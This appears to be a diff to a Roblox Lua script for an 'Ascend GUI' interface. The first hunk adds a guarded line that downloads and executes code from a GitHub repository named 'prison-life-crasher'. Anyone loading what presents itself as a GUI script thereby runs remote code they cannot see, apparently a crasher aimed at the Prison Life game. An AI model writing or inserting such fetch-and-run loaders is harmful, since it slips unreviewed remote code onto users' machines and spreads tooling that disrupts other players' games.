@@ -1,3 +1,13 @@
+if not _G.hasExecuted1 then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sauce-boss01/prison-life-crasher/main/a", true))()
+
+_G.hasExecuted1 = true
+
+else
+	warn("real")
+end
+
 local RunService = game:GetService("RunService")
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
@@ -41,6 +51,10 @@ end)
 
 
 local G2L = {};
+
+_G.ScriptIs = "Ascend GUI"
+
+
 
 -- StarterGui.AscendGUI
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
